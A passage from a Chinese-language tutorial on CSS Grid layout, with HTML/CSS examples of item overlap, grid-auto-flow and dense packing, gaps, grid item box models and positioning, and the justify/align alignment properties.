align-items: flex-start;\n        flex-flow: column; border-left: 1px solid; }\n    .labels2 { display: inline-grid; grid-template-rows: 1fr 2fr 1fr; height: 200px;\n        padding: 0; margin-left: 0; margin-top: 0; vertical-align: top; }\n    .labels2 li { border-top: 1px solid; justify-content: flex-end; }\n    .labels2 li i::after { content: " || "; margin-right: 4px; }\n    .labels2 li i:last-child::after { content: ""; }\n</style>\n</head>\n<body>\n    <ul class="labels1">\n        <li class="col"><i>col-start</i><i>1</i></li>\n        <li class="col"><i>col-end</i><i>main-start</i><i>2</i></li>\n        <li class="col"><i>main-end</i><i>3</i></li>\n    </ul>\n    <ul class="labels2">\n        <li class="col"><i>r1-start</i><i>1</i></li>\n        <li class="col"><i>r1-end</i><i> r2-start</i><i>2</i></li>\n        <li class="col"><i>r2-end</i><i>3</i></li>\n    </ul>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01 one" id="masthead">box01</span>\n        <span class="box02 two" id="sidebar">box02</span>\n        <span class="box03 three" id="main">box03</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n以上代码效果图：\n\n\n\n# 4.4 元素重叠以及异常处理\n\n将元素添加到网格中时，元素是可以重叠的（可以是可以但要避免出现这样的情况）。\n\n<html>\n<head>\n<style>\n    #grid { width: 54em; height: 17em; border: 1px solid; }\n    #grid {display: grid;\n        grid-template-rows: 50% 50%; grid-template-columns: 50% 50%;}\n    .box01 { grid-area: 1 / 1 / 2 / 3; border: 5px solid; border-color: hotpink; }\n    .box02 { grid-area: 1 / 2 / 3 / 2; border: 5px solid; border-color: skyblue; }\n    span { border: 1px dashed; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01 one" id="masthead">1</span>\n        <span class="box02 two" id="sidebar">2</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n以上代码效果图：\n\n\n不只是在数字引用的网格线下添加元素出现重叠的现象，网格区域也是同样的。后添加的会遮住先添加的。\n\n<html>\n<head>\n<style>\n    #grid { width: 50em; height: 15em; border: 1px solid;\n        grid-template-columns: 1fr 3fr;\n        grid-template-rows: 4em 7em 4em; }\n    #grid { display: grid;\n        grid-template-areas:\n            "header header"\n            "sidebar content"\n            "footer footer"; }\n    #header { grid-area: header; border: 5px solid; border-color: skyblue; }\n    #sidebar { grid-area: sidebar / sidebar / footer-end / sidebar;\n        border: 5px solid; border-color: springgreen; }\n    #footer { grid-area: footer; border: 5px solid; border-color: salmon; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01 one" id="header">header</span>\n        <span class="box02 two" id="sidebar">sidebar</span>\n        <span class="box03" id="footer">footer</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n以上代码效果图：\n\n\n    添加元素时的异常处理：\n\n 1. 开始线数值大于结束线数值 grid-row-start: 5; grid-row-end: 2;会自动转变为grid-row-start: 2; grid-row-end: 5;\n\n 2. 开始线和结束线都声明为跨度 grid-row-start: span; grid-row-end: span 3;，结束线的跨度会被忽略，会转变为grid-row-start: span 1; grid-row-end: auto;，然后根据网格流自动放置，后面小节会讲。\n\n 3. 只用具名跨度指明网格元素位置 grid-row-start: span footer; grid-row-end: auto;，这个和上面说的隐式网格很像，但是不一样，因为有个auto。这种情况也是会转变为grid-row-start: span 1; grid-row-end: auto;\n\n 4. grid-area四个值缺少一两个 开始线值是网格线名称，缺少的结束线值与开始线值相同；开始线值是数值，缺少的结束线值则是auto\n\n\n# 五、网格流\n\n\n# 5.1 行优先和列优先\n\n如果不明确指定网格元素在网格中的位置的话，网格元素会在网格流的作用下自动放在网格中合适的位置。网格流grid-auto-flow有两种模式：行优先和列优先。所谓“行优先”就是尽量占满一行再去排列下一行，“列优先”就是尽量先占满一列。\n\n<html>\n<head>\n<style>\n    .grid { grid-template-columns: repeat(3, 200px);\n        grid-template-rows: repeat(2, 50px); border: 1px solid; }\n    .grid { display: grid; width: 600px; height: 100px;\n        grid-auto-flow: column/*row*/;}\n    .grid li { grid-row: auto; grid-column: auto; }\n    ol { list-style:none; padding: 0; }\n    .box01 { border: 5px solid; border-color: skyblue; }\n    .box02 { border: 5px solid; border-color: springgreen; }\n    .box03 { border: 5px solid; border-color: salmon; }\n    .box04 { border: 5px solid; border-color: hotpink; }\n    .box05 { border: 5px solid; border-color: lawngreen; }\n</style>\n</head>\n<body>\n    <ol class="grid">\n        <li class="box01">1</li><li class="box02">2</li>\n        <li class="box03">3</li><li class="box04">4</li>\n        <li class="box05">5</li>\n    </ol>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n以上代码效果图：\n\n\n可以看到上面的例子使用的是grid-row: auto; grid-column: auto;，因为默认每个网格元素一样大。但是如果每个网格元素的尺寸不一（并且大于网格区域的大小），再这样写就不合适了，必须给尺寸过大的网格元素添加跨度。\n\n<html>\n<head>\n<style>\n    #grid {display: grid;\n        grid-template-rows: repeat(4, 50px);\n        grid-template-columns: repeat(4, 50px);\n        grid-auto-rows: 50px;\n        grid-auto-columns: 50px;\n    }\n    img {grid-row: auto; grid-column: auto;}\n    img {width: 50px; height; 50px; border: 1px solid silver; box-sizing: border-box;}\n    img.wide {width: 90px; height: 50px;}\n    img.tall {width: 50px; height: 90px;}\n    img.big {width: 90px; height: 90px;}\n    img.wide {grid-column: auto / span 2;}\n    img.tall {grid-row: auto / span 2;}\n    img.big {grid-row: auto / span 2; grid-column: auto / span 2;}\n</style>\n</head>\n<body>\n    <div id="grid">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="wide">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="tall">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="big">\n        <img src="./yinyang.png" alt="" class="wide">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="">\n        <img src="./yinyang.png" alt="" class="">\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n以上代码效果图：\n\n\n\n# 5.2 网格流和浮动的区别\n\n你会发现上面的例子上留出了很多间隙，原因是留出的空间放不下后面紧接着的元素了，就算能放下也不能超出前面元素的顶边。是不是觉得网格流和浮动有些像，但是浮动要比网格流规则更复杂。情况稍有不同，可以看下面例子中的13号元素的位置，想一想为什么。\n\n<html>\n<head>\n<style>\nspan { box-sizing: border-box; }\n\n.float { display: inline-block; width: 320px; height: 320px; }\n.float span { float: left; width: 80px; height: 80px; }\n.float span.wide { width: 160px; }\n.float span.tall { height: 160px; }\n\n.grid { display: inline-grid;\n    grid-template-columns: repeat(4, 80px);\n    grid-template-rows: repeat(4, 80px);\n    grid-auto-columns: 80px;\n    grid-auto-rows: 80px;\n    vertical-align: top;\n    margin-left: 200px;\n}\n.grid { grid-auto-flow: row; }\n.grid span { align-items: start; padding-top: 0.25em; }\n.grid span.wide { grid-column: auto / span 2; }\n.grid span.tall { grid-row: auto / span 2; }\n\nspan[class*="box"] { font-size: 1.5em; border: 5px solid; }\n*[class*="01"] { color: hsl(0,67%,50%); background: hsla(0,67%,50%,0.2); border-color: skyblue; }\n*[class*="02"] { color: hsl(24,67%,50%); background: hsla(24,67%,50%,0.2); border-color: salmon; }\n*[class*="03"] { color: hsl(48,67%,50%); background: hsla(48,67%,50%,0.2); border-color: hotpink; }\n*[class*="04"] { color: hsl(72,67%,50%); background: hsla(72,67%,50%,0.2); border-color: lawngreen; }\n*[class*="05"] { color: hsl(96,67%,50%); background: hsla(96,67%,50%,0.2); border-color: blueviolet; }\n*[class*="06"] { color: hsl(120,67%,50%); background: hsla(120,67%,50%,0.2); border-color: burlywood; }\n*[class*="07"] { color: hsl(144,67%,50%); background: hsla(144,67%,50%,0.2); border-color: chartreuse; }\n*[class*="08"] { color: hsl(168,67%,50%); background: hsla(168,67%,50%,0.2); border-color: chocolate; }\n*[class*="09"] { color: hsl(192,67%,50%); background: hsla(192,67%,50%,0.2); border-color: cornflowerblue; }\n*[class*="10"] { color: hsl(216,67%,50%); background: hsla(216,67%,50%,0.2); border-color: cyan; }\n*[class*="11"] { color: hsl(240,67%,50%); background: hsla(240,67%,50%,0.2); border-color: darkgoldenrod; }\n*[class*="12"] { color: hsl(264,67%,50%); background: hsla(264,67%,50%,0.2); border-color: darkmagenta; }\n*[class*="13"] { color: hsl(288,67%,50%); background: hsla(288,67%,50%,0.2); border-color: darkorange; }\n*[class*="14"] { color: hsl(312,67%,50%); background: hsla(312,67%,50%,0.2); border-color: darkorchid; }\n*[class*="15"] { color: hsl(336,67%,50%); background: hsla(336,67%,50%,0.2); border-color: darksalmon; }\n*[class*="16"] { color: hsl(360,67%,50%); background: hsla(360,67%,50%,0.2); border-color: feldspar; }\n\n</style>\n</head>\n<body>\n    <div class="float">\n        <span class="box01">1</span><span class="box02 wide">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="box08 tall">8</span><span class="box09">9</span>\n        <span class="box10">10</span><span class="box11 wide tall">11</span><span class="box12">12</span>\n        <span class="box13">13</span><span class="box14">14</span><span class="box15">15</span>\n        <span class="box16">16</span>\n    </div>\n    <div class="grid">\n        <span class="box01">1</span><span class="box02 wide">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="box08 tall">8</span><span class="box09">9</span>\n        <span class="box10">10</span><span class="box11 wide tall">11</span><span class="box12">12</span>\n        <span class="box13">13</span><span class="box14">14</span><span class="box15">15</span>\n        <span class="box16">16</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n以上代码效果图：\n\n\n浮动规则中有一条“如果前面元素左浮动，那么后面浮动元素的左边界必定处于前面元素右边界的右侧，除非后面浮动元素的顶边在前面浮动元素的下边”。11和12所在行没有13的位置了，11的左右都有13所需要的空间，但是由于前面这条规则，13只能放在11的右侧了。你可能想为什么不与14、15和16放在一行呢？因为浮动规则中还有一条“满足其他条件后，浮动元素要尽可能上移”，所以13只能放在12的下面且11的右侧了。而网格流并没有这样的限制，它只需要保证“不超出前面元素顶边”就可以了（上面例子的右边这部分里的13就可以放在11的左侧了，但12仍旧和浮动场景一样，不能超过前面元素的顶边）。\n\n\n# 5.3 密集流\n\n“不超出前面元素顶边”是为了保证元素编号的不错乱，其实有一种密集流可以让网格元素紧靠着不用管什么编号顺序了，grid-auto-flow: row dense;是行优先的密集流，grid-auto-flow: column dense;是列优先的密集流。下面这个例子左边的12才不管前面的顶边在哪，会直接占据上面的空位；同样右边的11才不会管前面的左边界在哪，会直接占据左边的空位。\n\n<html>\n<head>\n<style>\nspan { box-sizing: border-box; }\n\n.grid {display: inline-grid;\n    grid-template-columns: repeat(4, 80px);\n    grid-template-rows: repeat(4, 80px);\n    grid-auto-columns: 80px;\n    grid-auto-rows: 80px;\n    vertical-align: top;\n    margin-right: 5em;\n}\n#g1 {grid-auto-flow: row dense;}\n#g2 {grid-auto-flow: column dense;}\n\n#g1 span {align-items: start; padding-top: 0.25em;}\n#g2 span {justify-content: flex-start; padding-left: 0.25em;}\n\n.wide {grid-column: auto / span 2;}\n.tall {grid-row: auto / span 2;}\n\nspan[class*="box"] { font-size: 1.5em; border: 5px solid; }\n*[class*="01"] { color: hsl(0,67%,50%); background: hsla(0,67%,50%,0.2); border-color: skyblue; }\n*[class*="02"] { color: hsl(24,67%,50%); background: hsla(24,67%,50%,0.2); border-color: salmon; }\n*[class*="03"] { color: hsl(48,67%,50%); background: hsla(48,67%,50%,0.2); border-color: hotpink; }\n*[class*="04"] { color: hsl(72,67%,50%); background: hsla(72,67%,50%,0.2); border-color: lawngreen; }\n*[class*="05"] { color: hsl(96,67%,50%); background: hsla(96,67%,50%,0.2); border-color: blueviolet; }\n*[class*="06"] { color: hsl(120,67%,50%); background: hsla(120,67%,50%,0.2); border-color: burlywood; }\n*[class*="07"] { color: hsl(144,67%,50%); background: hsla(144,67%,50%,0.2); border-color: chartreuse; }\n*[class*="08"] { color: hsl(168,67%,50%); background: hsla(168,67%,50%,0.2); border-color: chocolate; }\n*[class*="09"] { color: hsl(192,67%,50%); background: hsla(192,67%,50%,0.2); border-color: cornflowerblue; }\n*[class*="10"] { color: hsl(216,67%,50%); background: hsla(216,67%,50%,0.2); border-color: cyan; }\n*[class*="11"] { color: hsl(240,67%,50%); background: hsla(240,67%,50%,0.2); border-color: darkgoldenrod; }\n*[class*="12"] { color: hsl(264,67%,50%); background: hsla(264,67%,50%,0.2); border-color: darkmagenta; }\n*[class*="13"] { color: hsl(288,67%,50%); background: hsla(288,67%,50%,0.2); border-color: darkorange; }\n*[class*="14"] { color: hsl(312,67%,50%); background: hsla(312,67%,50%,0.2); border-color: darkorchid; }\n*[class*="15"] { color: hsl(336,67%,50%); background: hsla(336,67%,50%,0.2); border-color: darksalmon; }\n*[class*="16"] { color: hsl(360,67%,50%); background: hsla(360,67%,50%,0.2); border-color: feldspar; }\n\n</style>\n</head>\n<body>\n    <div class="grid" id="g1">\n        <span class="box01">1</span><span class="box02 wide">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="box08 tall">8</span><span class="box09">9</span>\n        <span class="box10">10</span><span class="box11 wide tall">11</span><span class="box12">12</span>\n        <span class="box13">13</span><span class="box14">14</span><span class="box15">15</span>\n        <span class="box16">16</span>\n    </div>\n    <div class="grid" id="g2">\n        <span class="box01">1</span><span class="box02 wide">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="box08 tall">8</span><span class="box09">9</span>\n        <span class="box10 wide tall">10</span><span class="box11">11</span><span class="box12">12</span>\n        <span class="box13">13</span><span class="box14">14</span><span class="box15">15</span>\n        <span class="box16">16</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n以上代码效果图：\n\n\n\n# 六、元素在网格空间中的布局\n\n\n# 6.1 栏距\n\n栏距就是两个网格轨道之间的距离，给网格单元之间添加间隔，与表格布局中的border-spacing很像。具体使用的是grid-row-gap和grid-column-gap，不能取百分比也不能使用fr，只能使用常用的距离单位px、rem等。当然，栏距有简写属性grid-gap: xxx xxx，第一个值就是行间距，第二个字就是列间距。\n\n<html>\n<head>\n<style>\n    .grid { display: grid; width: 500px; height: 500px; border: 1px solid;\n        grid-template-rows: 150px 1fr 150px; grid-template-columns: 15% 1fr 1fr;\n        grid-column-gap: 1em; grid-row-gap: 25px; }\n    span[class*="box"] { font-size: 1.5em; border: 5px solid; }\n    *[class*="01"] { color: hsl(0,67%,50%); background: hsla(0,67%,50%,0.2); border-color: skyblue; }\n    *[class*="02"] { color: hsl(24,67%,50%); background: hsla(24,67%,50%,0.2); border-color: salmon; }\n    *[class*="03"] { color: hsl(48,67%,50%); background: hsla(48,67%,50%,0.2); border-color: hotpink; }\n    *[class*="04"] { color: hsl(72,67%,50%); background: hsla(72,67%,50%,0.2); border-color: lawngreen; }\n    *[class*="05"] { color: hsl(96,67%,50%); background: hsla(96,67%,50%,0.2); border-color: blueviolet; }\n    *[class*="06"] { color: hsl(120,67%,50%); background: hsla(120,67%,50%,0.2); border-color: burlywood; }\n    *[class*="07"] { color: hsl(144,67%,50%); background: hsla(144,67%,50%,0.2); border-color: chartreuse; }\n    *[class*="08"] { color: hsl(168,67%,50%); background: hsla(168,67%,50%,0.2); border-color: chocolate; }\n    *[class*="09"] { color: hsl(192,67%,50%); background: hsla(192,67%,50%,0.2); border-color: cornflowerblue; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="g1">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box05">7</span><span class="box03">8</span><span class="box01">9</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上代码效果图：\n\n\n\n# 6.2 网格元素的盒模型\n\n在添加网格元素这节里，我们确定了添加网格元素后它所在区域的空间大小，也就是我们这节所说的网格空间。网格空间可以跨好几个网格单元，网格单元之间由于栏距还可以有间隔，这都是网格空间本身的性质。\n\n网格元素在网格空间里布局时，可能因为网格元素本身的盒模型而让网格元素显示的效果而不同（但不会影响网格空间）。其实可以把它看作是一种父子元素的布局，如果子元素（网格元素）是块级元素，那完全可以使用块级元素的隐藏等式，也就是margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right = the width of the parent element\n\n<html>\n<head>\n<style>\n    .grid { display: grid; height: 200px; width: 400px;\n        border: 1px solid;\n        grid-template-rows: repeat(2, 100px);\n        grid-template-columns: repeat(2, 200px);}\n    .box02 {margin: 25px;}\n    .box03 {margin: -25px 0;}\n    span[class*="box"] { font-size: 1.5em; border: 5px solid; }\n    *[class*="01"] { color: hsl(0,67%,50%); border-color: skyblue; }\n    *[class*="02"] { color: hsl(24,67%,50%); border-color: salmon; }\n    *[class*="03"] { color: hsl(48,67%,50%); border-color: hotpink; }\n    *[class*="04"] { color: hsl(72,67%,50%); border-color: lawngreen; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="g1">\n        <span class="box01">1</span><span class="box02">2</span>\n        <span class="box03">3</span><span class="box04">4</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n以上代码效果图：\n\n\n可以看到上面这个例子，4个盒子的宽高都是auto，如果都没有内外边距，那么他们都是刚好占满网格空间，box1和box4都是如此。而box2和box3是带了外边距的，box2是正值的外边距，又由于网格空间的宽度始终不变，那么box2的宽度会往内部缩小；box3是负值的外边距，又由于网格空间的宽度始终不变，那么box3的宽度会往外部增大。宽度也是可以这么解释的。\n\n在块级元素的隐藏等式下，如果宽度固定，左右的外边距会根据具体的情况进行变化。比如，左右外边距都设置了值，按照书写模式一般会舍弃右外边距；如果右外边距设置的是固定值，左外边距设置的是auto，那么左外边距会自动变化；如果左外边距设置的是固定值，右外边距设置的是auto，那么右外边距会自动变化。这些都是盒模型布局中常见的知识了。\n\n\n# 6.3 网格元素的绝对定位\n\n其实与块级元素一样，网格元素使用定位时也有一个定位元素的隐藏等式。即使宽高是固定值，“舍弃”以及“auto”与上一节虽然类似但还是比较复杂的，具体可以参考absolute绝对定位。\n\n<html>\n<head>\n<style>\n    #grid {display: grid; width: 500px;\n        grid-template-rows: repeat(3, 100px);\n        grid-template-columns: repeat(5, 100px); }\n    span { border: 1px dotted red; }\n    .exel { grid-row: 2 / 4; grid-column: 2 / 5; position: relative; }\n    .exel i { border: 5px solid skyblue;}\n    .exel i {\n        position: absolute;\n        top: 10px; bottom: 20px;\n        left: 30px; right: 40px; }\n</style>\n</head>\n<body>\n    <div class="grid boxed lines" id="grid">\n        <span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span>\n        <span class="exel"><i class="box01">exel</i></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上代码效果图：\n\n\ngrid-row-end: auto和grid-column-end: auto，这两个对网格元素盒模型和绝对定位是有影响的，情况不好确定，先留在这里等后面有时间再来研究了。\n\n\n# 七、网格的对齐方式\n\n网格布局的对齐方式与弹性盒布局的对齐方式十分相像，可以看下表。\n\n属性                对齐目标               适用于\njustify-self      行内方向（横向）上的单个网格元素   网格元素\njustify-items     行内方向（横向）上的全部网格元素   网格容器\njustify-content   行内方向（横向）上的整个网格     网格容器\nalign-self        块级方向（纵向）上的单个网格元素   网格元素\nalign-items       块级方向（纵向）上的全部网格元素   网格容器\nalign-content     块级方向（纵向）上的整个网格     网格容器\n\n\n# 7.1 xxx-self\n\njustify-self（横向）和align-self（纵向）是针对某个网格元素来说的，也就是说它设置在网格元素上的。它们共同拥有6个值：\n\n * start：让网格元素向网格空间的起边对齐。不受网格空间的direction: xxx;影响，但受到网格容器的direction: xxx;影响。\n * end：让网格元素向网格空间的终边对齐。不受网格空间的direction: xxx;影响，但受到网格容器的direction: xxx;影响。\n * center：在对齐轴上居中对齐。\n * self-start：让网格元素向网格空间的书写模式的起边对齐。只受网格空间本身的direction: xxx;影响。\n * self-end：让网格元素向网格空间的书写模式的终边对齐。只受网格空间本身的direction: xxx;影响。\n * stretch：拉伸，但必须保证网格元素对应的宽或高是auto不然不会进行拉伸。\n\njustify-self独有的2个值：\n\n * left：横向上就是居左对齐，不受任何direction: xxx;影响。\n * right：横向上就是居右对齐，不受任何direction: xxx;影响。\n\nalign-self独有的1个值：\n\n * baseline：让当前网格元素与同一轨道中最低的那个网格元素的baseline进行对齐。\n\n<html>\n<head>\n<style>\nbody {width: auto;}\n.grid {display: grid; padding: 0.5em; margin: 0.25em 0 2em;\n    grid-gap: 0.75em 0.5em;}\n#g1 {grid-template-rows: 6em; grid-template-columns: repeat(10, 9em);}\n#g2 {grid-template-rows: 6em; grid-template-columns: repeat(10, 9em);}\n\nh1 {grid-row: span 1 / 1; grid-column: 1 / span 8;\n     background: rgba(0,0,0,0.15);\n     padding: 0.5em 0 0.25em;\n    text-align: center; font: 1.33em helvetica, sans-serif; margin: 0;}\nh1 code {font: 1.1em monospace, serif;}\n\n#g1 [class*="box"] {height: auto; align-self: center;}\n#g2 [class*="box"] {width: auto; justify-self: center;}\n\n#g1 .box01 {justify-self: start;}\n#g1 .box02 {justify-self: end;}\n#g1 .box03 {justify-self: center;}\n#g1 .box04 {justify-self: self-start; direction: rtl;}\n#g1 .box05 {justify-self: self-end; direction: rtl;}\n#g1 .box06 {justify-self: stretch;}\n#g1 .box07 {justify-self: left;}\n#g1 .box08 {justify-self: right;}\n\n#g2 .box01 {align-self: start;}\n#g2 .box02 {align-self: end;}\n#g2 .box03 {align-self: center;}\n#g2 .box04 {align-self: self-start; }\n#g2 .box05 {align-self: self-end; }\n#g2 .box06 {align-self: stretch;}\n#g2 .box07 {align-self: baseline;}\n\ndiv[id] span[class*="box"] {box-sizing: border-box; border: 2px solid; background: transparent;}\n\nspan[class*="01"] {grid-row: 1; grid-column: 1;}\nspan[class*="02"] {grid-row: 1; grid-column: 2;}\nspan[class*="03"] {grid-row: 1; grid-column: 3;}\nspan[class*="04"] {grid-row: 1; grid-column: 4;}\nspan[class*="05"] {grid-row: 1; grid-column: 5;}\nspan[class*="06"] {grid-row: 1; grid-column: 6;}\nspan[class*="07"] {grid-row: 1; grid-column: 7;}\nspan[class*="08"] {grid-row: 1; grid-column: 8;}\nspan[class*="gridline"] {color: blue; border: 1px dashed; margin: -1px 0 0 -1px;}\n</style>\n</head>\n<body>\n    <div class="grid small" id="g1">\n        <h1><code>justify-self</code> values <em>(inline-axis alignment)</em></h1>\n        <span class="box01">start</span><span class="box02">end</span>\n        <span class="box03">center</span><span class="box04">self-start (rtl)</span>\n        <span class="box05">self-end (rtl)</span><span class="box06">stretch</span>\n        <span class="box07">left</span><span class="box08">right</span>\n        <span class="gridline01"></span><span class="gridline02"></span>\n        <span class="gridline03"></span><span class="gridline04"></span>\n        <span class="gridline05"></span><span class="gridline06"></span>\n        <span class="gridline07"></span><span class="gridline08"></span>\n    </div>\n    <div class="grid small" id="g2">\n        <h1><code>align-self</code> values<em>(block-axis alignment)</em></h1>\n        <span class="box01">start</span><span class="box02">end</span>\n        <span class="box03">center</span><span class="box04">self-start (rtl)</span>\n        <span class="box05">self-end (rtl)</span><span class="box06">stretch</span>\n        <span class="box07">baseline</span>\n        <span class="gridline01"></span><span class="gridline02"></span>\n        <span class="gridline03"></span><span class="gridline04"></span>\n        <span class="gridline05"></span><span class="gridline06">\n        </span><span class="gridline07">xx</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\n以上代码效果图：\n\n\n\n# 7.2 xxx-items\n\njustify-items（横向）和align-items（纵向）是针对网格容器中所有网格元素而言的（但是设置在网格容器上），可以使用xxx-self进行单个覆盖，也就是说xxx-self的取值也适用于xxx-items。\n\n\n# 7.3 xxx-content\n\njustify-content（横向）和align-content（纵向）是针对网格容器中所有网格单元而言的，一般用于网格单元总空间小于网格容器时（剩余空间）。它们共同拥有6个值：\n\n * start：默认值，让所有网格单元按照横轴的起边对齐，也就是让剩余空间全部放到横轴的终边。受到网格容器的direction: xxx;影响\n * end：让所有网格单元按照横轴的终边对齐，也就是让剩余空间全部放到横轴的起边。受到网格容器的direction: xxx;影响\n * center：让所有网格单元在横轴中间对齐，也就是让剩余空间放到横轴两边，网格单元之间不留空隙。\n * space-between：网格单元之间的空间会相同，第一个网格单元与start之间不留空隙，最后一个网格单元与end之间不留空隙。\n * space-around：网格单元之间的空间会相同，第一个网格单元与start有空隙而其数值是网格单元之间空隙的一半，最后一个网格单元与end有空隙而其数值是网格单元之间空隙的一半。\n * space-evenly：网格单元之间的空间会相同，第一个网格单元与start有空隙而其数值就等于网格单元之间的空隙，最后一个网格单元与end有空隙而其数值就等于网格单元之间的空隙。\n\njustify-content（横向）独有left和right属性（align-content没有这两个值），不受到网格容器的direction: xxx;影响。\n\n<html>\n<head>\n<style>\nbody {width: auto;}\n.grid { display: grid; border: 1px solid;\n    grid-template-rows: 45px;\n    grid-template-columns: repeat(5, 96px); }\n\nh1 { margin: 13px 0 0 2px; padding: 0; text-align: center; }\nh1 code {font: 16px monospace, serif;}\n\n#g1 {justify-content: start;direction: rtl;}\n#g2 {justify-content: end;direction: rtl;}\n#g3 {justify-content: center;}\n#g4 {justify-content: space-between;}\n#g5 {justify-content: space-around;}\n#g6 {justify-content: space-evenly;}\n#g7 {justify-content: right;direction: rtl;}\n#g8 {justify-content: left;direction: rtl;}\n\nspan {border: 1px dashed; }\ndiv[id] span[class*="box"] {box-sizing: border-box; background: hsla(117,50%,50%,0.25);}\n\nspan[class*="01"] {grid-row: 1; grid-column: 1;}\nspan[class*="02"] {grid-row: 1; grid-column: 2;}\nspan[class*="03"] {grid-row: 1; grid-column: 3;}\nspan[class*="04"] {grid-row: 1; grid-column: 4;}\nspan[class*="05"] {grid-row: 1; grid-column: 5;}\n\n</style>\n</head>\n<body>\n    <h1><code>justify-content: start</code></h1>\n    <div class="grid small" id="g1">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: end</code></h1>\n    <div class="grid small" id="g2">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: center</code></h1>\n    <div class="grid small" id="g3">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: space-between</code></h1>\n    <div class="grid small" id="g4">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: space-around</code></h1>\n    <div class="grid small" id="g5">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: space-evenly</code></h1>\n    <div class="grid small" id="g6">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: 